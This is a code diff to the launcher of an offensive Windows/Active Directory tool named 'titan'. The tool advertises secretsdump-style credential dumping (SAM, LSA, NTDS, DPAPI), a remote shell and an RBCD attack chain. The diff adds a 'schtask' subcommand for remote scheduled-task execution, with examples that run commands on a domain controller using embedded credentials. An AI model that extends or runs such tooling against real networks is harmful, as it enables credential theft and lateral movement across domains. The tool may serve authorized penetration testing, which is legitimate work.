@@ -7,9 +7,10 @@ Think secretsdump + evil-winrm + RBCD, with impacket-compatible flags.
 Usage: titan <subcommand> [options]
 
 Subcommands:
-  dump   Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
-  shell  Interactive WMI+SMB shell (evil-winrm-style)
-  rbcd   Resource-Based Constrained Delegation attack chain
+  dump     Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
+  shell    Interactive WMI+SMB shell (evil-winrm-style)
+  schtask  Scheduled task operations (create/run/delete/query via MS-TSCH)
+  rbcd     Resource-Based Constrained Delegation attack chain
 
 Run  titan <subcommand> -h  for per-subcommand help.
 
@@ -20,6 +21,10 @@ Quick examples:
   KRB5CCNAME=Administrator.ccache titan dump -k -no-pass -t 192.168.15.40
 
   titan shell ECORP/Administrator:'P@ss'@192.168.15.42
+
+  titan schtask query ECORP/veeam-admin:'B@ckupP@ssw0rd'@ecorp-dc.ecorp.local
+  titan schtask exec  ECORP/veeam-admin:'B@ckupP@ssw0rd'@ecorp-dc.ecorp.local -c cmd.exe -a "/c whoami > C:\\out.txt"
+
   titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
 """
 
@@ -45,6 +50,9 @@ def main():
         _m()
     elif sub == 'shell':
         from titanlib.shell import main as _m
+        _m()
+    elif sub == 'schtask':
+        from titanlib.schtask import main as _m
         _m()
     elif sub == 'rbcd':
         from titanlib.rbcd import main as _m
